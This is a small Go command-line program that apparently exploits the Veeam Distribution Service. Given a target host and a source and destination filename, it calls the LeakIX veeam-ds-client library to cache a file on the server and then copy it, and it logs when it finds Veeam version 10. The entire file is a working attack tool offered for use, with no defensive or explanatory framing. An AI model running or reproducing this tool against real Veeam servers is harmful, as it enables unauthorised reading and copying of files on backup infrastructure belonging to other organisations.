package main

import (
	"github.com/LeakIX/veeam-ds-client/v11"
	"log"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 4 {
		log.Fatalln("./veeamcp <target> <source-filename> <target-filename>")
	}
	target, sourceFile, targetFile := os.Args[1], os.Args[2], os.Args[3]
	time.Sleep(1 * time.Second)
	log.Println("Preparing file for copy")
	err := v11.CacheFile(target, sourceFile)
	if err == v11.IsVeeam10Err {
		log.Fatalln("Found Veeam version v10")
	}
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Prepared file for download, requesting file")
	err = v11.VeeamCopy(target, sourceFile, targetFile)

	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Done")
}
